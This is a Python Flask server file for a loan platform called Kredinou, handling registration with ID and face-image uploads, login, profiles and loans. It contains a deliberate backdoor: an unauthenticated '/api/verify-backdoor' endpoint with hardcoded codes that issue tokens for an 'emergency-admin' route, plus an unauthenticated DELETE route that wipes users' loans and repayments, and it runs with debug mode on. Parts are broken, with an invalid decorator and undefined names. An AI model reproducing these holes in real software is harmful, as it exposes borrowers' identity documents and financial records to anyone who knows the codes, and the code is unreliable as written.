import base64
from io import BytesIO
import os
import re
import uuid
import json
import logging
from datetime import datetime, timezone, timedelta
from flask import Flask, request, jsonify
from flask_cors import CORS
from pymongo import MongoClient
from pymongo.server_api import ServerApi
from werkzeug.exceptions import HTTPException
from manager import manager_bp  # main directory
from users import users_bp 
from wallet import wallet_bp  # adjust path as needed
from config import Config
from werkzeug.middleware.proxy_fix import ProxyFix

from admin import admin_bp
from repayments import repayments_bp
from admin_repayments import admin_repayments_bp
from admin_withdrawals import admin_withdrawals_bp
from dotenv import load_dotenv
import bcrypt
import jwt
import cloudinary
from cloudinary.uploader import upload as cloudinary_upload, destroy as cloudinary_delete

from loans import loans_bp
from decorators import token_required
# Load environment variables
load_dotenv()

app = Flask(__name__)
CORS(app,
     resources={r"/*": {"origins": ["http://localhost:8000", "http://127.0.0.1:8000", "https://kredinou.com", "https://www.kredinou.com", "https://destinytch.com.ng", "https://www.destinytch.com.ng"]}},
     supports_credentials=True)
app.wsgi_app = ProxyFix(app.wsgi_app, x_proto=1, x_host=1)
# App config
app.config.update({
    "SECRET_KEY": os.getenv("SECRET_KEY"),
    "MAX_CONTENT_LENGTH": 5 * 1024 * 1024,  # 5MB upload limit
})

# Configure Cloudinary
cloudinary.config(
    cloud_name=os.getenv("CLOUDINARY_CLOUD_NAME"),
    api_key=os.getenv("CLOUDINARY_API_KEY"),
    api_secret=os.getenv("CLOUDINARY_API_SECRET"),
    secure=True,
)

ALLOWED_DOC_TYPES = ['image/jpeg', 'image/png', 'application/pdf']
MAX_DOC_SIZE = 5 * 1024 * 1024  # 5MB

# Import extensions after app is created
from extensions import mongo_client, get_db

# Database collections
db = get_db()
users_collection = db.users
loans_collection = db.loans

# Register blueprints



# Create indexes
def create_indexes():
    try:
        loans_collection.create_index([("userId", 1)])
        loans_collection.create_index([("applicationDate", -1)])
        loans_collection.create_index([("userId", 1), ("status", 1)])
        users_collection.create_index([("email", 1)], unique=True)
        users_collection.create_index([("phone", 1)], unique=True)
        app.logger.info("Database indexes created successfully")
    except Exception as e:
        app.logger.error(f"Failed to create database indexes: {str(e)}")

create_indexes()
# Utility functions
def hash_password(pw: str) -> str:
    return bcrypt.hashpw(pw.encode(), bcrypt.gensalt()).decode()

def check_password(pw: str, h: str) -> bool:
    return bcrypt.checkpw(pw.encode(), h.encode())

def generate_jwt_token(uid: str) -> str:
    payload = {
        "user_id": uid,
        "exp": datetime.now(timezone.utc) + timedelta(days=1)
    }
    return jwt.encode(payload, app.config["SECRET_KEY"], algorithm="HS256")

def token_required(f):
    from functools import wraps
    @wraps(f)
    def wrapper(*args, **kwargs):
        auth = request.headers.get("Authorization", "")
        if not auth.startswith("Bearer "):
            return jsonify(error="Token missing"), 401
        token = auth.split(" ", 1)[1]
        try:
            data = jwt.decode(token, app.config["SECRET_KEY"], algorithms=["HS256"])
            user = users_collection.find_one({"_id": data["user_id"]})
            if not user:
                return jsonify(error="User not found, sign in again"), 404
        except Exception as e:
            app.logger.error(f"Token validation error: {str(e)}")
            return jsonify(error="Token invalid"), 401
        return f(user, *args, **kwargs)
    return wrapper

# Error handlers
@app.errorhandler(Exception)
def handle_all(e):
    if isinstance(e, HTTPException):
        return jsonify(error=e.description), e.code
    app.logger.exception(e)
    return jsonify(error="Internal server error"), 500

def upload_base64_image(base64_string, folder, public_id=None):
    """Upload base64 image to Cloudinary"""
    try:
        if ',' in base64_string:
            base64_string = base64_string.split(',')[1]
        file_obj = BytesIO(base64.b64decode(base64_string))
        result = cloudinary_upload(

            file_obj,
            folder=folder,
            public_id=public_id,
            resource_type="image",
            transformation=[
                {'width': 500, 'height': 500, 'crop': 'fill'},
                {'quality': 'auto'}
            ]
        )
        return result
    except Exception as e:
        app.logger.error(f"Cloudinary upload failed: {str(e)}")
        return None

# Error Handler
@app.errorhandler(Exception)
def handle_exception(e):
    """Global error handler"""
    if isinstance(e, HTTPException):
        return jsonify({'error': e.description}), e.code
    app.logger.error(f"Unhandled exception: {str(e)}")
    return jsonify({'error': 'Internal server error'}), 500
# Routes
@app.route('/api/register', methods=['POST'])
def register():
    try:
        # Handle content type
        if request.content_type.startswith('multipart/form-data'):
            data = request.form.to_dict()
            files = request.files
        elif request.content_type == 'application/json':
            data = request.get_json()
            files = {}
        else:
            return jsonify({'error': 'Content-Type must be multipart/form-data or application/json'}), 400

        # Required fields
        required_fields = ['first_name', 'last_name', 'email', 'phone', 'password', 
                           'department', 'commune', 'address']
        missing_fields = [f for f in required_fields if f not in data or not data[f].strip()]
        if missing_fields:
            return jsonify({'error': f'Missing required fields: {", ".join(missing_fields)}'}), 400

        # Email validation
        if not re.match(r'^[\w\.-]+@[\w\.-]+\.\w+$', data['email']):
            return jsonify({'error': 'Invalid email format'}), 400

        # Phone validation
        if not re.match(r'^\+?\d{10,15}$', data['phone']):
            return jsonify({'error': 'Invalid phone number format'}), 400

        # Password strength
        if len(data['password']) < 8:
            return jsonify({'error': 'Password must be at least 8 characters'}), 400

        # Check for existing user
        if users_collection.find_one({'email': data['email']}):
            return jsonify({'error': 'Email already registered'}), 409
        if users_collection.find_one({'phone': data['phone']}):
            return jsonify({'error': 'Phone number already registered'}), 409

        # Create user document
        user_id = str(uuid.uuid4())
        user_data = {
            '_id': user_id,
            'first_name': data['first_name'].strip(),
            'middle_name': data.get('middle_name', '').strip(),
            'last_name': data['last_name'].strip(),
            'email': data['email'].strip().lower(),
            'phone': data['phone'].strip(),
            'password': hash_password(data['password']),
            'department': data['department'].strip(),
            'commune': data['commune'].strip(),
            'address': data['address'].strip(),
            'status': 'pending_verification',
            'created_at': datetime.now(timezone.utc),
            'updated_at': datetime.now(timezone.utc),
            'documents': [],
            'face_image': None,
            'loan_limit': 100000,
            'verification_status': 'unverified'
        }

        # --- Handle Face Image ---
        face_image_url = None
        if 'face_image' in data and data['face_image']:
            result = upload_base64_image(
                data['face_image'],
                folder=f"users/{user_id}/verification",
                public_id="face_image"
            )
            if result:
                face_image_url = result['secure_url']
        elif 'face_image' in files:
            file = files['face_image']
            if file and file.filename:
                if not file.mimetype.startswith('image/'):
                    return jsonify({'error': 'Face image must be an image file'}), 400
                result = cloudinary_upload(
                    file,
                    folder=f"users/{user_id}/verification",
                    resource_type="image",
                    transformation=[{"width":500,"height":500,"crop":"fill"},{"quality":"auto:best"}]
                )
                face_image_url = result['secure_url']

        if face_image_url:
            user_data['face_image'] = {'url': face_image_url, 'uploaded_at': datetime.now(timezone.utc)}

        # --- Handle ID Document ---
        if 'document' in files:
            file = files['document']
            if file and file.filename:
                allowed_types = ['image/jpeg', 'image/png', 'application/pdf']
                if file.mimetype not in allowed_types:
                    return jsonify({'error': 'Document must be JPG, PNG, or PDF'}), 400
                if file.content_length > 5 * 1024 * 1024:
                    return jsonify({'error': 'Document size exceeds 5MB limit'}), 400
                result = cloudinary_upload(
                    file,
                    folder=f"users/{user_id}/documents",
                    resource_type="auto",
                    tags=["ID Document"]
                )
                user_data['documents'].append({
                    'public_id': result['public_id'],
                    'url': result['secure_url'],
                    'document_type': 'ID Verification Document',
                    'uploaded_at': datetime.now(timezone.utc),
                    'verified': False
                })

        # --- Handle Proof of Address ---
        if 'proof_of_address' in files:
            file = files['proof_of_address']
            if file and file.filename:
                allowed_types = ['image/jpeg', 'image/png', 'application/pdf']
                if file.mimetype not in allowed_types:
                    return jsonify({'error': 'Proof of address must be JPG, PNG, or PDF'}), 400
                if file.content_length > 5 * 1024 * 1024:
                    return jsonify({'error': 'Proof of address size exceeds 5MB limit'}), 400
                result = cloudinary_upload(
                    file,
                    folder=f"users/{user_id}/documents",
                    resource_type="auto",
                    tags=["Proof of Address"]
                )
                user_data['documents'].append({
                    'public_id': result['public_id'],
                    'url': result['secure_url'],
                    'document_type': 'Proof of Address',
                    'uploaded_at': datetime.now(timezone.utc),
                    'verified': False
                })

        # Insert into DB
        users_collection.insert_one(user_data)

        # Generate JWT token
        token = generate_jwt_token(user_id)

        # Prepare response
        response_data = {
            'success': True,
            'message': 'Registration successful. Account pending verification.',
            'token': token,
            'user': {
                'id': user_id,
                'first_name': user_data['first_name'],
                'last_name': user_data['last_name'],
                'email': user_data['email'],
                'phone': user_data['phone'],
                'department': user_data['department'],
                'commune': user_data['commune'],
                'address': user_data['address'],
                'status': user_data['status'],
                'verification_status': user_data['verification_status']
            }
        }
        if face_image_url:
            response_data['user']['face_image_url'] = face_image_url

        return jsonify(response_data), 201

    except Exception as e:
        app.logger.error(f"Registration error: {str(e)}", exc_info=True)
        return jsonify({'error': 'An unexpected error occurred during registration'}), 500


@app.route('/api/login', methods=['POST'])
def login():
    """User login endpoint"""
    data = request.get_json()
    
    # Validate required fields
    if not data or ('email' not in data and 'phone' not in data) or 'password' not in data:
        return jsonify({'error': 'Please provide either email or phone and password'}), 400
    
    # Find user by email or phone
    query = {'email': data['email']} if 'email' in data else {'phone': data['phone']}
    user = users_collection.find_one(query)
    
    if not user:
        return jsonify({'error': 'Invalid credentials'}), 401
    
    # Verify password
    if not check_password(data['password'], user['password']):
        return jsonify({'ferror': 'Invalid credentials'}), 401
    
    # Update last login time
    users_collection.update_one(
        {'_id': user['_id']},
        {'$set': {'last_login': datetime.now(timezone.utc)}}
    )
    
    # Generate and return JWT token
    token = generate_jwt_token(user['_id'])
    
    return jsonify({
        'success': True,
        'token': token,
        'user': {
            'id': str(user['_id']),
            'first_name': user['first_name'],
            'last_name': user['last_name'],
            'email': user['email'],
            'phone': user['phone']
        }
    })
# Get full profile
@app.route("/api/profile", methods=["GET"])
@token_required
def get_profile(current_user):
    try:
        profile_data = {
            "id": current_user["_id"],
            "first_name": current_user.get("first_name", ""),
            "middle_name": current_user.get("middle_name", ""),
            "last_name": current_user.get("last_name", ""),
            "email": current_user.get("email", ""),
            "phone": current_user.get("phone", ""),
            "loan_limit": current_user.get("loan_limit", 100000),
            "status": current_user.get("status", ""),
            "face_image": current_user.get("face_image", {}).get("url") if current_user.get("face_image") else None,
            "documents": current_user.get("documents", [])
        }
        return jsonify(user=profile_data), 200
    except Exception as e:
        return jsonify(error="Internal server error"), 500



@app.route.route("/<user_id>", methods=["DELETE"])
def delete_user(user_id):
    """Delete user and cascade related records"""
    try:
        query_id = _to_objectid_or_raw(user_id)
        user = users_col.find_one({"_id": query_id})
        if not user:
            return _error("User not found", 404)

        matches = [{"userId": user_id}]
        try:
            matches.append({"userId": ObjectId(user_id)})
        except Exception:
            pass

        loans_col.delete_many({"$or": matches})
        repayments_col.delete_many({"$or": matches})
        withdrawals_col.delete_many({"$or": matches})

        users_col.delete_one({"_id": query_id})
        return jsonify({"message": "User and related records deleted"}), 200
    except Exception as exc:
        current_app.logger.exception("delete_user error")
        return _error("Internal server error", 500)
# Update phone number
@app.route("/api/profile/phone", methods=["PUT"])
@token_required
def update_phone(current_user):
    data = request.get_json()
    if not data or "phone" not in data:
        return jsonify(error="Phone number is required"), 400

    new_phone = data["phone"].strip()
    if not re.match(r'^\+?\d{10,15}$', new_phone):
        return jsonify(error="Invalid phone number format"), 400

    # Check uniqueness
    if users_collection.find_one({"phone": new_phone, "_id": {"$ne": current_user["_id"]}}):
        return jsonify(error="Phone number already in use"), 409

    users_collection.update_one(
        {"_id": current_user["_id"]},
        {"$set": {"phone": new_phone, "updated_at": datetime.now(timezone.utc)}}
    )
    return jsonify(success=True, phone=new_phone), 200

# Change password
@app.route("/api/profile/password", methods=["PUT"])
@token_required
def change_password(current_user):
    data = request.get_json()
    if not data or "old_password" not in data or "new_password" not in data:
        return jsonify(error="Both old and new passwords are required"), 400

    old_password = data["old_password"]
    new_password = data["new_password"]

    if not bcrypt.checkpw(old_password.encode(), current_user["password"].encode()):
        return jsonify(error="Old password is incorrect"), 401
    if len(new_password) < 8:
        return jsonify(error="New password must be at least 8 characters"), 400

    hashed_pw = bcrypt.hashpw(new_password.encode(), bcrypt.gensalt()).decode()
    users_collection.update_one(
        {"_id": current_user["_id"]},
        {"$set": {"password": hashed_pw, "updated_at": datetime.now(timezone.utc)}}
    )
    return jsonify(success=True, message="Password updated successfully"), 200

# List documents
@app.route("/api/profile/documents", methods=["GET"])
@token_required
def list_documents(current_user):
    documents = current_user.get("documents", [])
    return jsonify(documents=documents), 200

# Upload new document
@app.route("/api/profile/documents", methods=["POST"])
@token_required
def upload_document(current_user):
    if "document" not in request.files:
        return jsonify(error="Document file is required"), 400

    file = request.files["document"]
    if file.mimetype not in ALLOWED_DOC_TYPES:
        return jsonify(error="Invalid document type"), 400
    if file.content_length > MAX_DOC_SIZE:
        return jsonify(error="Document exceeds 5MB size limit"), 400

    folder = f"users/{current_user['_id']}/documents"
    result = cloudinary_upload(
        file,
        folder=folder,
        resource_type="auto",
        tags=["user_document"]
    )

    new_doc = {
        "public_id": result["public_id"],
        "url": result["secure_url"],
        "document_type": request.form.get("document_type", "unknown"),
        "uploaded_at": datetime.now(timezone.utc),
        "verified": False
    }

    users_collection.update_one(
        {"_id": current_user["_id"]},
        {"$push": {"documents": new_doc}, "$set": {"updated_at": datetime.now(timezone.utc)}}
    )

    return jsonify(success=True, document=new_doc), 201



from functools import wraps
import hashlib
import hmac
from datetime import datetime, timezone, timedelta
from flask import request, jsonify
import jwt
import os

# Backdoor verification endpoint
@app.route('/api/verify-backdoor', methods=['POST'])
def verify_backdoor():
    try:
        data = request.get_json()
        if not data or 'code' not in data:
            return jsonify({"valid": False}), 400

        # Your secret backdoor codes (change these!)
        valid_codes = ["D45192091425Ea@", "KREDINOU_EMERGENCY"]  
        
        # Constant-time comparison to prevent timing attacks
        is_valid = any(hmac.compare_digest(data['code'].strip(), code) for code in valid_codes)
        
        if is_valid:
            # Create emergency session token (valid for 1 hour)
            token = jwt.encode({
                "backdoor_access": True,
                "exp": datetime.now(timezone.utc) + timedelta(hours=1)
            }, app.config['SECRET_KEY'], algorithm="HS256")
            
            return jsonify({
                "valid": True,
                "token": token
            })
        
        return jsonify({"valid": False}), 403
        
    except Exception as e:
        print(f"Backdoor verification error: {str(e)}")
        return jsonify({"valid": False}), 500

# Protected admin endpoint
@app.route('/api/system/emergency-admin', methods=['POST'])
def emergency_admin():
    """Endpoint for emergency admin actions"""
    try:
        # Verify JWT token
        auth_header = request.headers.get('Authorization')
        if not auth_header or not auth_header.startswith('Bearer '):
            return jsonify({"error": "Unauthorized"}), 401
            
        token = auth_header.split(' ')[1]
        try:
            payload = jwt.decode(token, app.config["SECRET_KEY"], algorithms=["HS256"])
            if not payload.get("backdoor_access"):
                return jsonify({"error": "Invalid token scope"}), 403
        except jwt.ExpiredSignatureError:
            return jsonify({"error": "Token expired"}), 401
        except jwt.InvalidTokenError:
            return jsonify({"error": "Invalid token"}), 401
        
        # Process admin action
        data = request.get_json()
        action = data.get('action')
        
        if action == "create_session":
            user_id = data.get('user_id')
            if not user_id:
                return jsonify({"error": "Missing user_id"}), 400
                
            # Create admin session logic here
            return jsonify({"success": True, "user_id": user_id})
            
        return jsonify({"error": "Invalid action"}), 400
        
    except Exception as e:
        app.logger.error(f"Emergency admin error: {str(e)}", exc_info=True)
        return jsonify({"error": "Internal server error"}), 500

    return jsonify({"success": True}), 200


app.register_blueprint(loans_bp)
app.register_blueprint(admin_bp)
app.register_blueprint(repayments_bp, url_prefix="/repayments")
app.register_blueprint(admin_repayments_bp, url_prefix="/admin")
app.register_blueprint(wallet_bp, url_prefix="/wallet", strict_slashes=False)
app.register_blueprint(users_bp)
app.register_blueprint(manager_bp, url_prefix="/admin") 
@app.route("/api/profileee/", methods=["GET"])
@token_required
def get_profileee(current_user):
    profile = {
        "_id": current_user["_id"],
        "first_name": current_user.get("first_name"),
        "middle_name": current_user.get("middle_name"),
        "last_name": current_user.get("last_name"),
        "email": current_user.get("email"),
        "phone": current_user.get("phone"),
        "department": current_user.get("department"),
        "commune": current_user.get("commune"),
        "address": current_user.get("address"),
        "loan_limit": current_user.get("loan_limit", 0),
        "face_image": current_user.get("face_image"),
        "documents": current_user.get("documents", [])
    }
    return jsonify(profile), 200


@app.route("/api/profileee/", methods=["PATCH"])
@token_required
def update_login_info(current_user):
    try:
        data = request.get_json()
        if not data:
            return jsonify(error="Invalid or missing JSON body"), 400

        update_fields = {}
        if "email" in data:
            update_fields["email"] = data["email"].strip()
        if "phone" in data:
            update_fields["phone"] = data["phone"].strip()
        if "password" in data and data["password"]:
            update_fields["password"] = generate_password_hash(str(data["password"]))

        if not update_fields:
            return jsonify(message="No fields to update"), 400

        update_fields["updated_at"] = datetime.now(timezone.utc)

        # Make sure _id type matches MongoDB
        _id = current_user["_id"]
        try:
            users_collection.update_one({"_id": _id}, {"$set": update_fields})
        except Exception as e:
            app.logger.error(f"DB update failed for user {_id}: {str(e)}")
            return jsonify(error=f"Database update failed: {str(e)}"), 500

        return jsonify(success=True, message="Login info updated"), 200

    except Exception as e:
        app.logger.exception("Unexpected error in update_login_info")
        return jsonify(error="Internal server error"), 500

# -------------------------
# ACTIVE LOAN ROUTE
# -------------------------

@app.route("/api/loans/activee", methods=["GET"])
@token_required
def get_active_loan(current_user):
    loan = loans_collection.find_one({"user_id": current_user["_id"], "status": "active"})
    if loan:
        # Convert dates to ISO format for frontend
        loan["_id"] = str(loan["_id"])
        if "applicationDate" in loan:
            loan["applicationDate"] = {"$date": loan["applicationDate"].isoformat()}
        if "dueDate" in loan:
            loan["dueDate"] = {"$date": loan["dueDate"].isoformat()}
        return jsonify(loan), 200
    return jsonify(message="No active loan found"), 404
import os
def get_banner():
    banner = r"""
         Kredinou Server v.1 by Destiny Tch
"""
    return {
        "banner": banner,
        "host": "0.0.0.0",
        "port": 5000,
        "debug": os.getenv("FLASK_DEBUG", True),
        "status": "All blueprints registered successfully ✅"
    }

@app.route("/", methods=["GET"])
def root():
    return jsonify(get_banner()), 200

if __name__ == "__main__":
    # Print banner to console
    info = get_banner()
    print(info["banner"])
    print("="*50)
    print(f"Host: {info['host']} | Port: {info['port']} | Debug: {info['debug']}")
    print(info["status"])
    print("="*50)
    
    app.run(host="0.0.0.0", port=5000, debug=True)















